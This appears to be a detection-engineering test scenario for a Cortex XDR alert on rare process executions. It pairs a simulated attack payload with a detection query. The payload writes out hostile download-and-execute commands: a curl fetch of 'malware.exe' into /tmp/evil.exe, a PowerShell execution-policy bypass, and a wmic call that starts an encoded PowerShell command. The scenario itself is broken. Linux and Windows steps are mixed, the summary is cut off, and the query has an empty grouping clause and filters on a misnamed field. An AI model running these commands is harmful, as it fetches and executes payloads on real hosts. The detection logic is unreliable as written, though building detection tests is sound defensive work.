identity.name: Rare Process Execution Chain via PowerShell and WMI
identity.summary: An attacker uses PowerShell to download and execute a payload via WMI, followed by a rare process execution pattern that triggers the 'Multiple Rare Process Executions in Organization' alert. Cortex s
identity.description: An attacker uses PowerShell to download and execute a payload via WMI, followed by a rare process execution pattern that triggers the 'Multiple Rare Process Executions in Organization' alert. Cortex should detect the unusual sequence of process starts and network activity.

payload.code:
curl -o /tmp/evil.exe http://192.0.2.55/malware.exe
stub chmod +x /tmp/evil.exe
powershell.exe -ExecutionPolicy Bypass -Command "Get-NetTCPConnection -State Established | Where-Object {$_.RemotePort -eq 443}"
wmic path win32_process call create "cmd /c start /b powershell.exe -EncodedCommand JABwAHcAcwAgACgAJABwAHcAcwApAA=="

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Multiple Rare Process Executions in Organization
biocs.description: Detection of multiple rare processes being executed in a short time window within the organization
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'powershell.exe' or actor_process_image_name = 'wmic.exe'
| comp count() as cnt by agent_hostname, action_process_image_name
| comp count() as cnt by
| filter count > 1
